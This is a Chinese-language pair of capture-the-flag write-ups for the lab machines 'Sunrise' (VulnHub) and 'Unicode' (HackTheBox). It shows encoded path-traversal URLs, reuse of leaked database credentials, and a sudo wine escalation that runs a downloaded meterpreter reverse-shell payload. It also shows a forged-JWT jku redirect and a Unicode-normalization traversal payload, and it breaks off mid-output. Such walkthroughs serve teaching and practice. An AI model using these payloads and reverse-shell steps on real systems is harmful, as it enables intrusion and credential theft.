![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub97.jpg)

打开user.txt查找文本，如下所示。 是一个简单的user的flag。 

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub98.jpg)

``` bash
a6050aecf6303b0b824038807d823a89
```

接下来对下面url爆破一波

``` bash
http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f
```

``` bash
root@kali:~# dirb http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Dec 25 03:38:57 2019
URL_BASE: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/ ----
+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)
+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)
+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.profile (CODE:200|SIZE:807)
                                                                               %2fweborf%2f/zt               
-----------------
END_TIME: Wed Dec 25 03:39:12 2019
DOWNLOADED: 4612 - FOUND: 3
```

访问下面url可得

``` bash
http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub99.jpg)

``` bash
show databases;
ALTER USER 'weborf'@'localhost' IDENTIFIED BY 'iheartrainbows44';
```

#### getshell

使用用户名和密码weborf/iheartrainbows44成功连接ssh

``` bash
root@kali:~# ssh weborf@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ECDSA key fingerprint is SHA256:4yaOo7mwlBs//3V1VVqqtiApksgelyI4AJwhIUfz0UQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
weborf@192.168.56.104's password: 
Linux sunrise 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec  5 16:24:32 2019 from 192.168.1.146
weborf@sunrise:~$ id
uid=1001(weborf) gid=1001(weborf) groups=1001(weborf)
weborf@sunrise:~$ whoami
weborf
weborf@sunrise:~$ pwd
/home/weborf
```

#### 提权

连接数据库获取用户名和密码

``` bash
weborf@sunrise:~$ mysql -uweborf -piheartrainbows44
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.3.18-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.028 sec)

MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
31 rows in set (0.000 sec)
MariaDB [mysql]> select * from user;
+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| Host      | User    | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string                     | password_expired | is_role | default_role | max_statement_time |
+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| localhost | root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket | *AF554C323F838EB43A3D464034692C0994346ED8 | N                | N       |              |           0.000000 |
| localhost | sunrise | thefutureissobrightigottawearshades       | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |
| localhost | weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |
+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+
3 rows in set (0.000 sec)
```

将root的hash值解密得到purplerain54732,直接root用户登录完成提权

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub100.jpg)

``` bash
weborf@sunrise:~$ su root
Password: 
root@sunrise:/home/weborf# ls
weborf-0.12.2
root@sunrise:/home/weborf# id
uid=0(root) gid=0(root) groups=0(root)
root@sunrise:/home/weborf# whoami
root
```

#### 得到flag

``` bash
root@sunrise:/home/weborf# cd /root
root@sunrise:~# ls
Desktop  Documents  Downloads  Groups  Logs  Manual  Music  Pictures  Public  Readme  root.txt  Templates  Users  Videos
root@sunrise:~# cat root.txt
            ^^                   @@@@@@@@@
       ^^       ^^            @@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@              ^^
                           @@@@@@@@@@@@@@@@@@@@
 ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~
 ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~
   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~
   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~
 ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~
       ~             ~        ~      ~      ~~   ~             ~

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

24edb59d21c273c033aa6f1689b0b18c
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub101.jpg)

<font color="red">What a beautiful sunrise!!!</font>

#### Other way

如果root的hash值解密不出来，还可以使用sunrise/thefutureissobrightigottawearshades登录，然后提权，密码拆开正常排序发现是

``` bash
the future is so bright i gotta wear shades
(未来是如此光明，以至于我必须戴上墨镜)
```

成功登录

``` bash
weborf@sunrise:~$ su sunrise                                                                                                                                                                                                               
Password:                                                                                                                                                                                                                                  
sunrise@sunrise:/home/weborf$ id                                                                                                                                                                                                           
uid=1000(sunrise) gid=1000(sunrise) groups=1000(sunrise),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)                                                                 
sunrise@sunrise:/home/weborf$ whoami                                                                                                                                                                                                       
sunrise
```

下面是提权进程，基本不需要各种提权脚本，手动更快更准

``` bash
sunrise@sunrise:~$ sudo -l
[sudo] password for sunrise:                                                                                                                                                                                                               
Matching Defaults entries for sunrise on sunrise:                                                                                                                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                                                                 
                                                                                                                                                                                                                                           
User sunrise may run the following commands on sunrise:                                                                                                                                                                                    
    (root) /usr/bin/wine

sunrise@sunrise:~$ cd /tmp
```

Wine（Wine不是模拟器的递归反义词）是一个免费的开放源代码兼容性层，旨在使为Microsoft Windows开发的计算机程序（应用程序软件和计算机游戏）能够在类似Unix的操作系统上运行。

可以以root身份运行wine，创建可以使用wine执行的payload。 使用msfpc进行payload创建。 创建payload后，将运行python一个liner将payload传输到目标计算机。

``` bash
root@kali:~# msfpc windows 192.168.56.102
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 [i]   IP: 192.168.56.102
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=192.168.56.102 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'


 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!

root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

将payload托管在攻击者的计算机上，使用wget工具将所述文件下载到目标计算机。 成功将payload传输到目标计算机之后，使用wine和sudo执行有效负载。

``` bash
sunrise@sunrise:/tmp$ wget http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe
--2019-12-25 04:29:12--  http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 73802 (72K) [application/x-msdos-program]
Saving to: ‘windows-meterpreter-staged-reverse-tcp-443.exe’

windows-meterpreter-staged-reverse-tcp-443.exe             100%[=======================================================================================================================================>]  72.07K  --.-KB/s    in 0s      

2019-12-25 04:29:12 (439 MB/s) - ‘windows-meterpreter-staged-reverse-tcp-443.exe’ saved [73802/73802]

sunrise@sunrise:/tmp$ sudo wine windows-meterpreter-staged-reverse-tcp-443.exe
[sudo] password for sunrise: 
```

使用msfpc工具生成payload时，还将运行payload侦听器所需的配置来生成Metasploit Framework ruby文件。 运行了该ruby文件，在该目标计算机上使用wine运行该文件时。 看到一个session弹出。 由于该文件是使用具有root特权shell的wine执行的，因此我们也获得了root权限。 遍历到根目录，当列出该目录中的所有文件时，找到root.txt的文件。

``` bash
root@kali:~# msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'                                                                                                                                                    
[*] Processing /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc for ERB directives.                                                                                                                                                 
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> use exploit/multi/handler                                                                                                                                              
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> set PAYLOAD windows/meterpreter/reverse_tcp                                                                                                                            
PAYLOAD => windows/meterpreter/reverse_tcp                                                                                                                                                                                                 
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> set LHOST 192.168.56.102                                                                                                                                               
LHOST => 192.168.56.102
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> set LPORT 443
LPORT => 443
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> set ExitOnSession false
ExitOnSession => false
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)> run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.102:443 
msf5 exploit(multi/handler) > [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (180320 bytes) to 192.168.56.104
[*] Meterpreter session 1 opened (192.168.56.102:443 -> 192.168.56.104:44876) at 2019-12-25 04:37:04 -0500
msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: sunrise\root
meterpreter > pwd
Z:\tmp
meterpreter > cd /root
meterpreter > ls
Listing: Z:\root
================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1602  fil   2019-12-05 17:24:31 -0500  .ICEauthority
100666/rw-rw-rw-  104   fil   2019-12-05 17:40:27 -0500  .Xauthority
100666/rw-rw-rw-  142   fil   2019-12-25 04:07:46 -0500  .bash_history
100666/rw-rw-rw-  570   fil   2010-01-31 06:52:26 -0500  .bashrc
40777/rwxrwxrwx   0     dir   2019-12-04 17:46:24 -0500  .cache
40777/rwxrwxrwx   0     dir   2019-12-04 15:48:21 -0500  .config
100666/rw-rw-rw-  35    fil   2019-12-04 15:46:34 -0500  .dmrc
40777/rwxrwxrwx   0     dir   2019-12-04 15:48:12 -0500  .gnupg
40777/rwxrwxrwx   0     dir   2019-12-04 14:29:33 -0500  .local
40777/rwxrwxrwx   0     dir   2019-12-04 17:46:29 -0500  .mozilla
100666/rw-rw-rw-  0     fil   2019-12-04 16:56:11 -0500  .odbc.ini
100666/rw-rw-rw-  148   fil   2015-08-17 11:30:33 -0400  .profile
40777/rwxrwxrwx   0     dir   2019-12-04 14:48:28 -0500  .rpmdb
100666/rw-rw-rw-  66    fil   2019-12-05 16:08:41 -0500  .selected_editor
40777/rwxrwxrwx   0     dir   2019-12-04 15:47:54 -0500  .ssh
100666/rw-rw-rw-  252   fil   2019-12-05 14:59:00 -0500  .wget-hsts
100666/rw-rw-rw-  2211  fil   2019-12-05 17:24:30 -0500  .xsession-errors
100666/rw-rw-rw-  2211  fil   2019-12-05 13:51:40 -0500  .xsession-errors.old
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Desktop
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Documents
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Downloads
40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Groups
40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Logs
40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Manual
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Music
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Pictures
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Public
40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Readme
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Templates
40777/rwxrwxrwx   0     dir   2007-08-29 11:03:26 -0400  Users
40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Videos
100666/rw-rw-rw-  701   fil   2019-12-05 17:22:55 -0500  root.txt

meterpreter > cat root.txt
            ^^                   @@@@@@@@@
       ^^       ^^            @@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@              ^^
                           @@@@@@@@@@@@@@@@@@@@
 ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~
 ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~
   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~
   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~
 ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~
       ~             ~        ~      ~      ~~   ~             ~

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

24edb59d21c273c033aa6f1689b0b18c
```

<font color="green">帅掉渣！！！还有更多方法请通过qq告诉我，我的qq:1185151867</font>

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end sunset-sunrise -->

</details>

<a id="case-unicode"></a>

## Unicode 归一化与路径判断

JWT 密钥来源、off-by-slash 和 Unicode 规范化分别影响不同边界。pyc 反编译和 treport/curl 参数处理组成后续提权段。

<p class="kb-provenance">来源 unicode · 原记录 2021-12-01 · 24 个代码块 · 15 处图片引用</p>

<details class="kb-evidence" id="record-unicode">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start unicode -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	27 Nov 2021
IP:	10.10.11.126

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2105.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### NMAP

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# nmap -sV -v -p- --min-rate=10000 10.10.11.126
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals only two open ports on the target. HTTP is running on Nginx. Let's look into HTTP.

Web page has login and register links. Upon hovering 'google about us', we'd see a redirect link.

``` bash
GET /redirect/?url=google.com HTTP/1.1
```

Let's create a new account and login.

After login we’d see below dashboard.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2106.jpg)

It has three more links, upload, buy now and logout. the first two links did not lead to anywhere. Server is using JWT as cookies.

``` bash
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdEB0ZXN0LmNvbSJ9.BAzUpzOSU72w-MproYXSq_JQp1eCGkv_XkihDOVYRs4Qu3WJcBw0bguRUPJlM_Xr3Qib_2FkUpuI8YczJn4IARiYVNvDfLp0C53O74Mk8Vk-w7Y7KmPKHPp6q4tGkNzZoU6cymaqjTTJ58EWx8koy1mMRnXyg6WSFXDwY8o2BSNqIC4vbbVtScl2CV8J_IV5mgbyKn0hiqPF7iIzJnxVJwpmgYStKyGcLpkbQljNL84JuuAY9LQxuj0NU4n3vOJaBxV6vGrpJWi3gDBJv81OdXv8mgNxBtT2aaNH8GlBXOGYn-6PdQoNyoLj_cqWacm0Cneq4A3HE0YCDU6npQpP3w
```

Let's decode this cookie with https://jwt.io

We got the decoded data. The interesting part of this data is, 'JKU'.

``` bash
The "jku" (Json Web Key Set URL) Header Parameter is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS (JSON Web Signature).
```

This JKU is pointing to a domain, add that domain to hosts file and read the file.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# curl http://hackmedia.htb/static/jwks.json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

The below links will help us to understand JWT, JWK and JKU.

 - [JSON Web Tokens (JWT) Demystified](https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640)
 - [JSON Web Key (JWK) draft-jones-json-web-key-03](https://openid.net/specs/draft-jones-json-web-key-03.html)

Based on the above blogs, below is the normal working process.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2107.jpg)

We need to redirect the JKU header request to our server.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2108.jpg)

The above representation is what we need to achieve. To do that, first we need to generate RSA key pair. For that we can use any one of the below tools.

 - [mkjwk simple JSON Web Key generator](https://mkjwk.org/)
 - [jwt_tool](https://github.com/ticarpi/jwt_tool)

I will use online generator for this demo. Select below options and generate the random RSA key pair.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2109.jpg)

After generating, you will see private and public keys just like below.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2110.jpg)

Now we have generated the keys, it's time to use these keys to craft the JSON Web Tokens. To do that we have to use default JWT and edit it accordingly.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2111.jpg)

The above is default JWT, taken from cookies after login. Now we need to edit three things.

 - JKU value
 - User Value: change it to admin
 - Public and Private Keys: add respective keys previously generated from online site.

Below is the final draft of JWT.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2112.jpg)

As you can see the difference between default 'JKU' value and crafted one, it is different. The objective is to redirect it to our server, if we just add our IP as JKU address it will not work, as 'hackmedia' is only one in the allow list and it gives us an error 'JKU validation failed'. The validation check is up to 'http://hackmedia.htb/static/'. We have to change /add after that. So, as we already know it is an NginX server, we can take advantage of 'off-by-slash' bug and take advantage of going one step back in the directory and use 'redirect' endpoint.

``` bash
http://hackmedia.com/redirect/?url=google.com
```

We already know it exists, so we just need to access it and redirect it to our Kali Machine. On Kali machine we set up a crafted 'jwks.json' file. Let's craft the 'jwks.json' file.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# curl http://hackmedia.htb/static/jwks.json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

 - 'n' : modulus value for the RSA public key

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2113.jpg)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# cat jwks.json 
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "kYtRuyinTL4D-22Q3WgbSWff3ClIie10qeeGjunpW-4DgO5WWlHMVI3qxyXnGPvVIfQuARkzNBGQ2O4rytPnF0OoSD6cCNxmGKqVoIratzskq28OFnfqO_QhEkVhGfd_drGqa0wMNEU312XVfGzfP7V_GWn9aQcLnaWMQUlDwYOKG_UEcOQgur3sKpCdZjMThYJ_33oYmhdtHd3sA-SaNiYtwWW2AJHcCJkaaxSN-lB1lx--pmTMqfL1fURJ_0n3vHO0jAs2Kwk2rm9rgQNABuQxgotu0IRNaK3R61d7Cz41evkQm2s9ya4XR0y1iqBRkElbFCpNUWt9hP3gb5Ty9Q",
            "e": "AQAB"
        }
    ]
}
```

The above is edited and replaced it with RSA n value which we have generated. Once you edit that, start a HTTP sever where that file is present. Everything is set, now the only thing is to copy the encoded JWT from the online website.

``` bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g
```

Copy the encoded JWT and add it as cookie value.

I am using Firefox add-on called 'cookie editor' to replace cookies easily. Save it and refresh the page.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2114.jpg)

We got the admin dashboard access. If you click on any of the saved reports, it will display you below message.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2115.jpg)

As you can see from address bar, it is fetching that pdf file from different location. There's a possibility of path traversal attack. Let's try to read any local file.

``` bash
../../../../etc/passwd
```

It is filtering our inputs, we need to bypass it. To bypass that we have to use 'unicode' characters. Below blog explains how to use it and it's impact.

 - [Unicode normalization vulnerabilities](https://lazarv.com/posts/unicode-normalization-vulnerabilities/)

For this machine, we will use below payload.

``` bash
http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
